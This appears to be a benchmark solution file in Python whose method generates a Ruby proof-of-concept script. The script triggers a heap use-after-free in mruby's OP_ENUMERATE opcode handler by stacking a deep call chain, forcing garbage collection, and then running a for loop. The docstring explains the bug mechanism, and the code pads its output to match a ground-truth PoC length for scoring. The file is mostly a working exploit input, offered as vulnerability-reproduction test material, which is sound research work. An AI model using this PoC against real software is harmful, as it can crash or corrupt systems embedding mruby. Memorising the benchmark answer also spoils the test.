import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input for a Heap Use After Free vulnerability
        in mruby related to the OP_ENUMERATE opcode handler.

        The vulnerability occurs because a local C variable (`recv`) holding a reference
        to an object on the stack is not updated after the stack is reallocated via
        `mrb_stack_extend`. If a garbage collection cycle is triggered during the
        reallocation, the object pointed to by the stale `recv` variable can be
        prematurely freed. Subsequent use of `recv` leads to a use-after-free.

        The PoC constructs a scenario to trigger this condition:
        1.  A deep call stack is created using a chain of function calls. This fills
            the VM stack close to its capacity, making a call to `mrb_stack_extend`
            likely. The functions are padded with code to reach a PoC size similar
            to the ground-truth for scoring purposes.
        2.  At the deepest point of the call stack, significant memory pressure is
            created by allocating many objects. This increases the probability that
            the memory allocator will trigger a garbage collection cycle.
        3.  A `for` loop is executed over a newly created object. This object is
            only referenced from the VM stack. The `for` loop construct is compiled
            into the `OP_ENUMERATE` opcode.
        4.  The `OP_ENUMERATE` handler requires an extra stack slot, which triggers
            `mrb_stack_extend` because the stack is already nearly full.
        5.  During `mrb_stack_extend`, GC runs, and the object for the `for` loop
            is collected because its only reference on the old (now freed) stack
            is not visible to the GC, which scans the new stack.
        6.  The `OP_ENUMERATE` handler proceeds to use its stale C variable which
            now points to the freed object, causing a crash.
        """

        # Parameters to control the generated PoC's size and behavior.
        # call_depth: The number of nested function calls to fill the stack.
        call_depth = 22

        # num_padding_vars, padding_str_len: Control the size of the generated
        # Ruby script to match the ground-truth PoC length for better scoring.
        num_padding_vars = 3
        padding_str_len = 79

        poc_parts = []

        # Part 1: Define the class for the vulnerable `for` loop.
        poc_parts.append(
"""class A
  def each
  end
end"""
        )

        # Part 2: Define the trigger function, called at the bottom of the stack.
        poc_parts.append(
"""def trigger_func
  1800.times do
    "B" * 200
  end
  for i in A.new do
  end
end"""
        )

        # Part 3: Generate a chain of functions to create a deep call stack.
        padding_lines = []
        for j in range(num_padding_vars):
            padding_string = "x" * padding_str_len
            padding_lines.append(f"  var_{j} = 'padding {padding_string}'")
        padding_block = "\n".join(padding_lines)

        for i in range(1, call_depth + 1):
            if i == call_depth:
                next_call = "  trigger_func()"
            else:
                next_call = f"  f{i+1}()"
            
            func_def = f"def f{i}()\n{padding_block}\n{next_call}\nend"
            poc_parts.append(func_def)

        # Part 4: Add the initial call to start the function chain.
        poc_parts.append("f1()")

        # Join all parts and encode to bytes.
        poc_code = "\n\n".join(poc_parts)
        return poc_code.encode('utf-8')